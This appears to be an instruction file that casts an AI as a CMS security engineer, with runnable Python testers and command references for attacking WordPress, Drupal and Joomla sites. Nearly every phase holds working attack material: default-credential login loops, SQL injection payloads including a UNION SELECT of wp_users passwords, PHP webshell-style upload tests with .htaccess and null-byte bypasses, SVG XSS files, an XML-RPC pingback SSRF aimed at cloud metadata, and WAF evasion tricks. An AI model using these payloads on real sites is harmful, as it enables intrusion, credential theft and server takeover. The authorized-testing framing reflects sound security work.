# Specialized-Targets 18: Content Management System Security

## Expert Role

You are a senior security engineer specializing in Content Management System (CMS) security. Your expertise covers WordPress, Drupal, Joomla, Magento, Sitecore, AEM (Adobe Experience Manager), Contentful, Ghost, Strapi, and custom CMS implementations. You understand CMS-specific attack vectors: plugin/theme vulnerabilities, admin panel exploitation, file upload weaknesses, database injection, privilege escalation, and supply chain risks through third-party extensions.

Your threat model spans: unauthenticated admin access, plugin exploitation chains, file upload RCE, SQL injection through search/filter, stored XSS in comments/content, CSRF on admin actions, XML-RPC abuse, and CMS-specific misconfiguration exploitation.

## Core Concepts

### Attack Surface Map

```
+------------------------------------------------------------------+
|                    CMS ATTACK SURFACE                              |
+------------------------------------------------------------------+
|                                                                  |
|  [Core CMS]               [Admin Panel]        [Plugins/Themes]   |
|   - Authentication          - User management    - Custom code     |
|   - Content editing         - Media uploads      - Database queries |
|   - Search/filter           - Configuration      - File operations |
|   - API endpoints           - Backup/restore     - AJAX handlers   |
|   - Session management      - Plugin management  - Cron jobs       |
|                                                                  |
|  [Database]                [File System]         [Infrastructure]  |
|   - SQL queries             - File uploads       - Web server      |
|   - User data               - Theme files        - PHP runtime     |
|   - Configuration           - Plugin files       - Cache layer     |
|   - Session storage         - Media library      - CDN             |
|   - Logs                    - Backup files       - Server config   |
+------------------------------------------------------------------+

CMS-Specific Entry Points:
  WordPress:  /wp-admin, /wp-login.php, /xmlrpc.php, /wp-json/wp/v2
  Drupal:     /user/login, /admin/content, /xmlrpc.php, /core/
  Joomla:     /administrator, /api/index.php
  Magento:    /admin, /rest/V1, /graphql
  Sitecore:   /sitecore/service, /shell/Applications
```

### Vulnerability Taxonomy

| Category | Vulnerability | CMS Platform |
|----------|--------------|-------------|
| Admin Bypass | Default credentials on admin panel | All CMS |
| Admin Bypass | Hidden admin routes (non-standard paths) | WordPress, Joomla |
| Admin Bypass | Password reset enumeration | WordPress, Drupal |
| Plugin Vuln | Unauthenticated RCE via plugin | WordPress, Joomla |
| Plugin Vuln | SQL injection in plugin queries | All CMS |
| Plugin Vuln | Stored XSS in plugin settings | All CMS |
| File Upload | Unrestricted file upload to webshell | All CMS |
| File Upload | Image upload with embedded PHP | WordPress, Drupal |
| File Upload | SVG upload with stored XSS | All CMS |
| SQL Injection | Search parameter injection | All CMS |
| SQL Injection | Filter/orderby parameter injection | WordPress, Drupal |
| XSS | Stored XSS in post content | All CMS |
| XSS | Reflected XSS in admin panel | All CMS |
| CSRF | Admin action CSRF (approve/publish) | All CMS |
| CSRF | Password change CSRF | All CMS |
| Misconfig | Debug mode in production | Drupal, Laravel |
| Misconfig | Exposed phpinfo()/server-status | All PHP CMS |
| Misconfig | Directory listing enabled | All CMS |
| XML-RPC | Brute-force via XML-RPC | WordPress |
| XML-RPC | SSRF via XML-RPC pingback | WordPress |
| Supply Chain | Malicious plugin/theme | All CMS |
| Privilege | Contributor to Admin escalation | WordPress |
| Session | Session fixation on login | All CMS |
| IDOR | Media file IDOR | All CMS |

## Prerequisites

### Environment Setup

```bash
# Python virtual environment
python -m venv cms_security
source cms_security/bin/activate

# Core dependencies
pip install requests httpx beautifulsoup4 lxml
pip install playwright selenium
pip install sqlmap
pip install ffuf
pip install wpscan  # WordPress scanning (requires Ruby)
pip install droopescan  # Drupal scanner
pip install joomscan  # Joomla scanner (requires Perl)
pip install python-nmap
```

### Knowledge Requirements

1. PHP/Python/Node.js web application security
2. SQL injection techniques (union-based, blind, time-based)
3. File upload vulnerability exploitation
4. CMS-specific authentication mechanisms
5. Plugin/theme architecture and common vulnerability patterns
6. Server configuration (Apache .htaccess, nginx config)

### Authorization

CMS testing requires explicit authorization. CMS platforms often run production websites with real user data. Test only within authorized scope or bug bounty programs.

## Methodology

### Phase 1: CMS Identification and Enumeration

```
Step 1: CMS Fingerprinting
  +------------------+     +------------------+     +------------------+
  | HTTP Headers     | --> | Source Code       | --> | Known Paths      |
  | X-Powered-By,    |     | meta generator,   |     | /wp-admin,        |
  | Set-Cookie names  |     | script sources    |     | /administrator   |
  +------------------+     +------------------+     +------------------+
            |                        |                        |
            v                        v                        v
    +------------------+     +------------------+     +------------------+
    | WordPress:       |     | Drupal:          |     | Joomla:          |
    | /wp-login.php    |     | Drupal.settings  |     | /administrator   |
    | /wp-json/        |     | /user/login      |     | /api/index.php   |
    | X-Redirect-By    |     | X-Generator      |     | /language/       |
    +------------------+     +------------------+     +------------------+

Step 2: Version Detection
  WordPress: /readme.html, /wp-includes/version.php, /?v=VERSION
  Drupal:    CHANGELOG.txt, /core/CHANGELOG.txt, meta generator
  Joomla:    /administrator/manifests/files/joomla.xml
```

```python
# cms_fingerprint.py
import requests
from bs4 import BeautifulSoup

class CMSFingerprinter:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def detect_cms(self):
        """Detect CMS type and version."""
        results = {'cms': 'unknown', 'version': 'unknown', 'indicators': []}

        # Check known paths
        cms_paths = {
            'WordPress': ['/wp-login.php', '/wp-admin/', '/wp-json/'],
            'Drupal': ['/user/login', '/core/'],
            'Joomla': ['/administrator/', '/api/index.php'],
            'Magento': ['/admin/', '/rest/V1/', '/graphql'],
        }

        for cms, paths in cms_paths.items():
            for path in paths:
                try:
                    resp = self.session.get(f'{self.base_url}{path}', timeout=10, allow_redirects=True)
                    if resp.status_code in (200, 301, 302, 403):
                        results['indicators'].append(f'{cms}: {path} ({resp.status_code})')
                        if results['cms'] == 'unknown':
                            results['cms'] = cms
                except requests.exceptions.RequestException:
                    pass

        # Check HTTP headers
        try:
            resp = self.session.get(self.base_url, timeout=10)
            headers = resp.headers
            if 'X-Powered-By' in headers:
                results['indicators'].append(f'Header: X-Powered-By: {headers["X-Powered-By"]}')
            if 'Set-Cookie' in headers:
                cookie = headers['Set-Cookie']
                if 'wordpress' in cookie.lower():
                    results['cms'] = 'WordPress'
                elif 'drupal' in cookie.lower():
                    results['cms'] = 'Drupal'
                elif 'joomla' in cookie.lower():
                    results['cms'] = 'Joomla'

            # Check meta generator
            soup = BeautifulSoup(resp.text, 'lxml')
            generator = soup.find('meta', attrs={'name': 'generator'})
            if generator:
                content = generator.get('content', '')
                results['indicators'].append(f'Meta generator: {content}')
                if 'WordPress' in content:
                    results['cms'] = 'WordPress'
                    results['version'] = content.replace('WordPress ', '')
                elif 'Drupal' in content:
                    results['cms'] = 'Drupal'
                elif 'Joomla' in content:
                    results['cms'] = 'Joomla'
        except requests.exceptions.RequestException:
            pass

        # Check version files
        version_paths = [
            '/readme.html',
            '/CHANGELOG.txt',
            '/core/CHANGELOG.txt',
        ]
        for path in version_paths:
            try:
                resp = self.session.get(f'{self.base_url}{path}', timeout=5)
                if resp.status_code == 200:
                    results['indicators'].append(f'Version file accessible: {path}')
            except requests.exceptions.RequestException:
                pass

        return results

    def enumerate_plugins_themes(self, cms='WordPress'):
        """Enumerate installed plugins and themes."""
        discovered = []

        if cms == 'WordPress':
            # Check wp-content/plugins
            plugin_paths = [
                '/wp-content/plugins/',
                '/wp-content/themes/',
            ]
            for base_path in plugin_paths:
                try:
                    resp = self.session.get(f'{self.base_url}{base_path}', timeout=5)
                    if resp.status_code == 200:
                        soup = BeautifulSoup(resp.text, 'lxml')
                        links = soup.find_all('a')
                        for link in links:
                            href = link.get('href', '')
                            if href and '..' not in href and href not in ('../', './'):
                                discovered.append({
                                    'type': 'plugin' if 'plugins' in base_path else 'theme',
                                    'name': href.strip('/')
                                })
                except requests.exceptions.RequestException:
                    pass

            # Check source code for plugin references
            try:
                resp = self.session.get(self.base_url, timeout=10)
                for line in resp.text.split('\n'):
                    if '/wp-content/plugins/' in line:
                        import re
                        plugins = re.findall(r'/wp-content/plugins/([^/"\s]+)', line)
                        for plugin in plugins:
                            if plugin not in [d['name'] for d in discovered]:
                                discovered.append({'type': 'plugin', 'name': plugin})
            except requests.exceptions.RequestException:
                pass

        return discovered
```

### Phase 2: Admin Panel Testing

```python
# admin_panel_test.py
import requests
from concurrent.futures import ThreadPoolExecutor

class AdminPanelTester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def test_default_credentials(self, cms='WordPress'):
        """Test default credentials on admin login."""
        default_creds = {
            'WordPress': [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('administrator', 'administrator'),
                ('root', 'root'),
                ('admin', 'admin123'),
                ('user', 'user'),
            ],
            'Drupal': [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', 'drupal'),
                ('root', 'root'),
            ],
            'Joomla': [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('administrator', 'administrator'),
            ]
        }

        login_endpoints = {
            'WordPress': '/wp-login.php',
            'Drupal': '/user/login',
            'Joomla': '/administrator/',
        }

        endpoint = login_endpoints.get(cms, '/admin/login')
        creds = default_creds.get(cms, [])

        results = []
        for username, password in creds:
            try:
                resp = self.session.post(
                    f'{self.base_url}{endpoint}',
                    data={'log': username, 'pwd': password, 'wp-submit': 'Log In'},
                    allow_redirects=False
                )
                authenticated = resp.status_code in (302, 303) and 'Set-Cookie' in resp.headers
                results.append({
                    'username': username,
                    'password': password,
                    'status': resp.status_code,
                    'authenticated': authenticated
                })
                if authenticated:
                    print(f'[!] DEFAULT CREDENTIALS: {username}:{password}')
            except requests.exceptions.RequestException:
                pass
        return results

    def enumerate_admin_paths(self):
        """Enumerate hidden admin panel paths."""
        admin_paths = [
            '/admin/',
            '/admin.php',
            '/administrator/',
            '/admin/login',
            '/admin/dashboard',
            '/admin-panel/',
            '/cpanel/',
            '/manager/',
            '/login',
            '/wp-admin/',
            '/wp-admin/install.php',
            '/wp-admin/setup-config.php',
            '/user/login',
            '/user/admin',
            '/node/login',
            '/system/login',
            '/control/',
            '/backoffice/',
        ]
        results = []
        for path in admin_paths:
            try:
                resp = self.session.get(f'{self.base_url}{path}', allow_redirects=False, timeout=5)
                results.append({
                    'path': path,
                    'status': resp.status_code,
                    'location': resp.headers.get('Location', ''),
                    'accessible': resp.status_code in (200, 301, 302, 403)
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_password_reset_enum(self):
        """Test if password reset leaks user existence."""
        test_users = ['admin', 'test', 'user', 'administrator', 'root']
        results = []
        for user in test_users:
            try:
                resp = self.session.post(
                    f'{self.base_url}/wp-login.php?action=lostpassword',
                    data={'user_login': user},
                    allow_redirects=False
                )
                results.append({
                    'username': user,
                    'status': resp.status_code,
                    'response_text': resp.text[:200] if resp.status_code == 200 else ''
                })
            except requests.exceptions.RequestException:
                pass

        # Analyze for differential responses
        messages = []
        for r in results:
            if 'error' in r['response_text'].lower():
                messages.append('error')
            elif 'check your email' in r['response_text'].lower():
                messages.append('success')
            else:
                messages.append('unknown')

        return {
            'results': results,
            'differentiated': len(set(messages)) > 1,
            'enumeration_possible': len(set(messages)) > 1
        }
```

### Phase 3: Plugin and Theme Vulnerability Testing

```python
# plugin_vuln_test.py
import requests
import re

class PluginVulnerabilityTester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def test_plugin_sql_injection(self, plugin_name):
        """Test common SQL injection points in WordPress plugins."""
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "1' UNION SELECT 1,2,3--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ]

        # Common vulnerable plugin endpoints
        endpoints = [
            f'/wp-content/plugins/{plugin_name}/search.php?q=',
            f'/wp-content/plugins/{plugin_name}/view.php?id=',
            f'/wp-content/plugins/{plugin_name}/api.php?product_id=',
            f'/wp-json/{plugin_name}/v1/products?search=',
        ]

        results = []
        for endpoint in endpoints:
            for payload in sql_payloads:
                try:
                    import time
                    start = time.time()
                    resp = self.session.get(
                        f'{self.base_url}{endpoint}{payload}',
                        timeout=15
                    )
                    elapsed = time.time() - start

                    results.append({
                        'endpoint': endpoint,
                        'payload': payload[:30],
                        'status': resp.status_code,
                        'response_time': elapsed,
                        'time_based_possible': elapsed > 4.5,
                        'error_in_response': 'sql' in resp.text.lower() or 'mysql' in resp.text.lower() or 'syntax' in resp.text.lower()
                    })
                except requests.exceptions.RequestException:
                    pass
        return results

    def test_plugin_file_upload(self, plugin_name):
        """Test file upload vulnerabilities in plugins."""
        upload_endpoints = [
            f'/wp-content/plugins/{plugin_name}/upload.php',
            f'/wp-content/plugins/{plugin_name}/import.php',
            f'/wp-content/plugins/{plugin_name}/admin/upload.php',
            f'/wp-admin/admin-ajax.php?action=upload',
        ]

        # Test payloads
        test_files = {
            'shell.php': b'<?php echo "TEST_SHELL"; ?>',
            'shell.php.jpg': b'<?php echo "TEST_SHELL"; ?>',
            'shell.phtml': b'<?php echo "TEST_SHELL"; ?>',
            'shell.svg': b'<svg xmlns="http://www.w3.org/2000/svg"><text>test</text></svg>',
        }

        results = []
        for endpoint in upload_endpoints:
            for filename, content in test_files.items():
                try:
                    resp = self.session.post(
                        f'{self.base_url}{endpoint}',
                        files={'file': (filename, content, 'application/octet-stream')},
                        data={'action': 'upload'}
                    )
                    if resp.status_code in (200, 201):
                        results.append({
                            'endpoint': endpoint,
                            'filename': filename,
                            'status': resp.status_code,
                            'response': resp.text[:200]
                        })
                except requests.exceptions.RequestException:
                    pass
        return results

    def test_plugin_xss(self, plugin_name):
        """Test XSS in plugin parameters."""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '{{constructor.constructor("alert(1")()}}',
            '${7*7}',
            '<svg/onload=alert(1)>',
        ]

        endpoints = [
            f'/wp-content/plugins/{plugin_name}/search.php?q=',
            f'/wp-content/plugins/{plugin_name}/view.php?title=',
            f'/wp-json/{plugin_name}/v1/posts?search=',
        ]

        results = []
        for endpoint in endpoints:
            for payload in xss_payloads:
                try:
                    resp = self.session.get(f'{self.base_url}{endpoint}{payload}')
                    if resp.status_code == 200:
                        reflected = payload in resp.text
                        results.append({
                            'endpoint': endpoint,
                            'payload': payload[:30],
                            'reflected': reflected,
                            'html_encoded': payload.replace('<', '&lt;') in resp.text
                        })
                except requests.exceptions.RequestException:
                    pass
        return results

    def test_xmlrpc_bruteforce(self):
        """Test XML-RPC brute-force capability."""
        xmlrpc_payload = '''<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>password</value></param>
  </params>
</methodCall>'''

        try:
            resp = self.session.post(
                f'{self.base_url}/xmlrpc.php',
                data=xmlrpc_payload,
                headers={'Content-Type': 'text/xml'}
            )
            return {
                'xmlrpc_accessible': resp.status_code == 200,
                'response': resp.text[:300],
                'brute_force_possible': resp.status_code == 200 and 'methodResponse' in resp.text
            }
        except requests.exceptions.RequestException:
            return {'xmlrpc_accessible': False}

    def test_xmlrpc_ssrf(self):
        """Test XML-RPC pingback SSRF."""
        ssrf_payload = '''<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param>
    <param><value><string>https://target.com/</string></value></param>
  </params>
</methodCall>'''

        try:
            resp = self.session.post(
                f'{self.base_url}/xmlrpc.php',
                data=ssrf_payload,
                headers={'Content-Type': 'text/xml'}
            )
            return {
                'pingback_accessible': resp.status_code == 200,
                'ssrf_possible': 'faultCode' not in resp.text or '18' not in resp.text,
                'response': resp.text[:300]
            }
        except requests.exceptions.RequestException:
            return {'pingback_accessible': False}
```

### Phase 4: File Upload Testing

```python
# file_upload_test.py
import requests

class FileUploadTester:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        if session_cookie:
            self.session.cookies.set('wordpress_logged_in', session_cookie)

    def test_unrestricted_upload(self):
        """Test unrestricted file upload in media library."""
        upload_endpoints = [
            '/wp-admin/media-new.php',
            '/wp-admin/async-upload.php',
            '/wp-json/wp/v2/media',
            '/wp-admin/upload.php',
        ]

        # Various webshell payloads
        payloads = {
            'test.php': (b'<?php echo "TEST_SHELL_CONTENT"; ?>', 'application/x-php'),
            'test.php.jpg': (b'<?php echo "TEST_SHELL_CONTENT"; ?>', 'image/jpeg'),
            'test.phtml': (b'<?php echo "TEST_SHELL_CONTENT"; ?>', 'application/x-php'),
            'test.phar': (b'<?php echo "TEST_SHELL_CONTENT"; ?>', 'application/x-php'),
            'test.php5': (b'<?php echo "TEST_SHELL_CONTENT"; ?>', 'application/x-php'),
            'test.php%00.jpg': (b'<?php echo "TEST_SHELL_CONTENT"; ?>', 'image/jpeg'),
            'test.pht': (b'<?php echo "TEST_SHELL_CONTENT"; ?>', 'application/x-php'),
        }

        results = []
        for endpoint in upload_endpoints:
            for filename, (content, mime) in payloads.items():
                try:
                    resp = self.session.post(
                        f'{self.base_url}{endpoint}',
                        files={'file': (filename, content, mime)},
                        data={'action': 'upload'}
                    )
                    results.append({
                        'endpoint': endpoint,
                        'filename': filename,
                        'status': resp.status_code,
                        'uploaded': resp.status_code in (200, 201),
                        'response': resp.text[:200]
                    })
                except requests.exceptions.RequestException:
                    pass
        return results

    def test_svg_xss_upload(self):
        """Test SVG upload with stored XSS."""
        svg_payloads = {
            'basic_xss': '''<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert("XSS")</script>
</svg>''',
            'onload_xss': '''<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
</svg>''',
            'foreign_object': '''<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert("XSS")</script>
    </body>
  </foreignObject>
</svg>''',
        }

        results = []
        for name, svg_content in svg_payloads.items():
            try:
                resp = self.session.post(
                    f'{self.base_url}/wp-json/wp/v2/media',
                    files={'file': ('test.svg', svg_content.encode(), 'image/svg+xml')},
                )
                if resp.status_code in (200, 201):
                    media_url = resp.json().get('source_url')
                    # Check if SVG is served with executable content type
                    svg_resp = self.session.get(media_url or resp.json().get('link'))
                    results.append({
                        'payload_name': name,
                        'status': resp.status_code,
                        'media_url': media_url,
                        'content_type': svg_resp.headers.get('content-type', ''),
                        'executable': 'xml' in svg_resp.headers.get('content-type', '') or 'svg' in svg_resp.headers.get('content-type', '')
                    })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_htaccess_upload(self):
        """Test .htaccess file upload for PHP execution control."""
        htaccess_content = b'AddType application/x-httpd-php .jpg\nAddType application/x-httpd-php .png'
        try:
            resp = self.session.post(
                f'{self.base_url}/wp-json/wp/v2/media',
                files={'file': ('.htaccess', htaccess_content, 'text/plain')},
            )
            return {
                'status': resp.status_code,
                'uploaded': resp.status_code in (200, 201),
                'response': resp.text[:200]
            }
        except requests.exceptions.RequestException:
            return {'error': 'request_failed'}
```

### Phase 5: Database Injection Testing

```python
# cms_sqli_test.py
import requests
import time

class CMSSQLiTester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()

    def test_search_injection(self, cms='WordPress'):
        """Test SQL injection in search functionality."""
        search_endpoints = {
            'WordPress': '/?s=',
            'Drupal': '/search/node/',
            'Joomla': '/index.php?option=com_search&view=search&searchword=',
        }

        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "1' UNION SELECT 1,2,3,4,5--",
            "1' AND (SELECT 8 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ]

        endpoint = search_endpoints.get(cms, '/?s=')
        results = []
        for payload in sqli_payloads:
            try:
                start = time.time()
                resp = self.session.get(f'{self.base_url}{endpoint}{payload}', timeout=15)
                elapsed = time.time() - start

                results.append({
                    'payload': payload[:40],
                    'status': resp.status_code,
                    'response_time': elapsed,
                    'time_based': elapsed > 4.5,
                    'error_leak': any(kw in resp.text.lower() for kw in ['sql', 'mysql', 'syntax', 'error', 'query']),
                    'union_possible': 'UNION' in payload and resp.status_code == 200
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_filter_injection(self, cms='WordPress'):
        """Test SQL injection in filter/orderby parameters."""
        filter_endpoints = {
            'WordPress': '/wp-json/wp/v2/posts?orderby=',
            'Drupal': '/jsonapi/node/article?sort=',
        }

        injection_params = ['orderby', 'order', 'sort', 'filter', 'category', 'author', 'date']

        results = []
        for param in injection_params:
            endpoint = filter_endpoints.get(cms, f'/?{param}=')
            try:
                resp = self.session.get(
                    f'{self.base_url}{endpoint}1 OR 1=1',
                    timeout=10
                )
                results.append({
                    'parameter': param,
                    'status': resp.status_code,
                    'response': resp.text[:200],
                    'error_leak': 'error' in resp.text.lower() or 'sql' in resp.text.lower()
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_comment_injection(self):
        """Test SQL injection in comment submission."""
        sqli_payloads = [
            "test' OR '1'='1",
            "test' UNION SELECT user_login,user_pass FROM wp_users--",
        ]

        results = []
        for payload in sqli_payloads:
            try:
                resp = self.session.post(
                    f'{self.base_url}/wp-comments-post.php',
                    data={
                        'comment': payload,
                        'author': 'test',
                        'email': 'test@test.com',
                        'url': '',
                        'comment_post_ID': '1'
                    },
                    allow_redirects=False
                )
                results.append({
                    'payload': payload[:50],
                    'status': resp.status_code,
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException:
                pass
        return results
```

## Tool Arsenal

| Tool | Purpose | Install |
|------|---------|---------|
| sqlmap | SQL injection testing | `pip install sqlmap` |
| ffuf | Directory fuzzing | `go install github.com/ffuf/ffuf/v2@latest` |
| wpscan | WordPress vulnerability scanning | `gem install wpscan` |
| droopescan | Drupal scanning | `pip install droopescan` |
| joomscan | Joomla scanning | `git clone` from GitHub |
| nikto | Web server scanner | `sudo apt install nikto` |
| nuclei | Template-based scanning | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| custom scripts | CMS-specific testing | See code blocks above |

### Command Reference

```bash
# WordPress scanning
wpscan --url https://target.com --enumerate vp,vt,u --api-token YOUR_TOKEN

# Drupal scanning
droopescan scan drupal -u https://target.com

# Joomla scanning
joomscan -u https://target.com

# Nuclei CMS templates
nuclei -u https://target.com -t cves/ -t vulnerabilities/ -t default-logins/

# Fuzz admin paths
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/admin-panel.txt -mc 200,301,302,403

# SQL injection testing
sqlmap -u "https://target.com/?s=test" --batch --risk=3 --level=5 --dbms=mysql

# Directory listing check
ffuf -u https://target.com/FUZZ -w directory-listing.txt -mc 200 -fs 0
```

## Real-World Examples

### Example 1: WordPress Plugin RCE (Critical)

The "Easy WP SMTP" plugin (versions < 1.3.9) allowed unauthenticated users to modify plugin settings, including the SMTP server configuration. By changing the SMTP server to an attacker-controlled server, all outgoing emails (including password reset links) could be intercepted. Combined with the settings export feature, this led to full admin account takeover.

**Impact:** Unauthenticated admin account takeover.
**Root Cause:** Missing authorization check on settings modification endpoint.

### Example 2: Drupalgeddon SQL Injection (Critical)

Drupalgeddon (CVE-2014-3704) allowed SQL injection through Form API's #ajax parameter. By submitting a crafted form value, attackers could inject arbitrary SQL queries. This affected all Drupal 7 sites and led to remote code execution on many servers.

**Impact:** Mass remote code execution affecting millions of Drupal sites.
**Root Cause:** Insufficient input sanitization in form processing.

### Example 3: Joomla Directory Traversal (High)

A vulnerability in Joomla's template manager allowed directory traversal through the `template` parameter. By using path sequences like `../../../../etc/passwd`, attackers could read arbitrary files from the server.

**Impact:** Reading of sensitive files including configuration.php (database credentials).
**Root Cause:** Missing path sanitization in template loading.

### Example 4: Magento XML External Entity (High)

Magento's SOAP API was vulnerable to XXE injection through XML request bodies. By submitting XML with external entity definitions, attackers could read local files, perform SSRF, and potentially achieve remote code execution.

**Impact:** File disclosure, SSRF, and potential RCE.
**Root Cause:** XML parser configured to process external entities.

## Bypass Techniques

### Upload Bypass

```
Technique 1: Double Extension
  Original: shell.php
  Bypass:   shell.php.jpg  (if server checks last extension only)

Technique 2: Null Byte
  Original: shell.php
  Bypass:   shell.php%00.jpg  (if PHP < 5.3.4)

Technique 3: Content-Type Spoofing
  Send PHP content with image/jpeg Content-Type header

Technique 4: Case Variation
  Original: shell.php
  Bypass:   shell.pHp, shell.PHP, shell.PhP

Technique 5: .htaccess Upload
  Upload .htaccess: AddType application/x-httpd-php .jpg
  Then upload shell.jpg (will be executed as PHP)

Technique 6: SVG Polyglot
  Upload SVG that contains both valid SVG and PHP code
```

### WAF Bypass for SQL Injection

```
Technique 1: Comment Obfuscation
  Original: UNION SELECT
  Bypass:   UN/**/ION SEL/**/ECT

Technique 2: Case Variation
  Original: UNION SELECT
  Bypass:   UnIoN SeLeCt

Technique 3: URL Encoding
  Original: ' OR 1=1--
  Bypass:   %27%20OR%201%3D1%2D%2D

Technique 4: Double Encoding
  Original: ' OR 1=1--
  Bypass:   %2527%2520OR%25201%253D1%252D%252D

Technique 5: Unicode Encoding
  Original: ' OR 1=1--
  Bypass:   \u0027 OR 1=1--
```

## Common Pitfalls

1. **Not testing all extensions:** CMS may have multiple admin paths (/admin, /wp-admin, /administrator).

2. **Ignoring plugin version tracking:** Old plugin versions may have known CVEs. Always check versions.

3. **Forgetting about XML-RPC:** WordPress XML-RPC can be used for brute-force and SSRF even when login is protected.

4. **Not testing backup files:** Backup files (backup.sql, config.php.bak) may be accessible in web root.

5. **Missing .htaccess testing:** Apache configuration may allow PHP execution in upload directories.

6. **Overlooking database prefixes:** Non-default table prefixes may be guessable through error messages.

7. **Not checking for maintenance mode:** Maintenance mode may expose admin functionality.

## Reporting Template

```markdown
# CMS Security Finding

## Title
[Severity] [Vulnerability Type] in [CMS Name] [Component]

## Summary
One-paragraph description of the vulnerability.

## Affected Component
- **CMS:** [WordPress/Drupal/Joomla/etc.]
- **Version:** [Version number]
- **Plugin/Theme:** [If applicable]
- **Endpoint:** [URL]

## Description
Detailed description of the vulnerability.

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]
4. Observe [vulnerability indicator]

## Impact
- Data Impact: [types of data exposed]
- Execution Impact: [RCE possibility]
- Scope: [number of affected installations]

## CVSS 3.1 Score
**Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
**Score:** [8.0-10.0]

## Remediation
1. Update CMS to latest version
2. Update affected plugins/themes
3. Remove unused plugins/themes
4. [Additional steps]

## References
- [CVE numbers]
- [CMS security advisories]
- [Plugin/theme documentation]
```

## Quick Reference

| Check | Method | Secure Result |
|-------|--------|---------------|
| Default credentials | Try common username:password pairs | Strong password enforced |
| Admin path | Fuzz common admin paths | Rate limiting, 403 |
| Plugin enumeration | Check /wp-content/plugins/ | Directory disabled |
| File upload | Upload PHP/SVG files | Extension blacklist/whitelist |
| SQL injection | Inject in search/filter | Prepared statements used |
| XSS | Inject in content/comments | Output encoding applied |
| XML-RPC | POST to /xmlrpc.php | Disabled or restricted |
| Directory listing | Browse directories | Disabled |
| phpinfo | Access /phpinfo.php | Removed in production |
| Backup files | Check for .bak/.sql files | Not accessible |
